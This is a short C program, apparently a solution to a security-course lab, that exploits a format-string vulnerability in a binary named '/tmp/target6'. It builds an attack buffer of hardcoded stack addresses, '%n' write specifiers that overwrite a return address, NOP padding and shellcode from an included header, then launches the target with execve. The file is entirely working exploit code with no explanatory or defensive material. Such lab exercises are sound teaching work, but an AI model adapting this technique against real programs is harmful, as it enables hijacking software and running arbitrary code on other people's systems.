#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char *args[3];
  char *env[1];

  char *fmt_str = 
    "\x2c\xfe\xff\xbf"
    "\x2d\xfe\xff\xbf"
    "\x2e\xfe\xff\xbf"
    "\x2f\xfe\xff\xbf"
    "%177u%4$n"
    "%062u%5$n"
    "%256u%6$n"
    "%192u%7$n";

  char attack_buffer[256];

  memset(attack_buffer, 0x90, 256);
  strcpy(attack_buffer, fmt_str); // irony points
  strcpy(attack_buffer + strlen(fmt_str), shellcode);


  args[0] = TARGET;
  args[1] = attack_buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
